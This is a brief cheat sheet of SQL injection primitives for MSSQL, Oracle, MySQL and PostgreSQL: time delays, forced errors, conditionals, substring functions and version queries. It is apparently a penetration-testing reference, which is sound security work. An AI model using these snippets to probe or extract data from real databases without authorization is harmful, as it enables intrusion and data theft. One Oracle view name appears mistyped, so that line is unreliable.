# Payload syntaxes

## MSSQL

### Sleep

```sql
WAITFOR DELAY '0:0:10'
```

### Error

```sql
BEGIN THROW 500001, 'THING',1; END
```

### IF/THEN/ELSE

```sql
IF (CONDITION) (ACTION IF TRUE)
```

### Substring

```sql
SUBSTRING()
```

### Version

```sql
@@version
```

## Oracle

### Sleep

```sql
dbms_pipe.receive_message(('a'),10)
```

### Error

```sql
TO_CHAR(1/0)
```

### IF/THEN/ELSE

```sql
SELECT CASE WHEN ($CONDITION) THEN (IF TRUE) ELSE (IF FALSE) END FROM DUAL
```

### Substring

```sql
SUBSTR()
```

### Version

```sql
SELECT BANNER FROM V$VERSION
SELECT BANNER FROM V$VINSTANCE
```

## MySQL

### Sleep

```sql
SLEEP(10)
```

### Error

```sql
// Trigger multiple lines
(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES)
```

### IF/THEN/ELSE

```sql
SELECT IF (($CONDITION), IF TRUE, IF FALSE)
```

### Substring

```sql
SUBSTR()
```

### Version

```sql
@@version
```

## PostgreSQL

### Sleep

```sql
SELECT pg_sleep(10)
```

### Error

```sql
1/(SELECT 0)
```

### IF/THEN/ELSE

```sql
SELECT CASE WHEN ($CONDITION) THEN (IF TRUE) ELSE (IF FALSE) END
```

### Substring

```sql
SUBSTRING()
```

### Version
```sql
version()
```
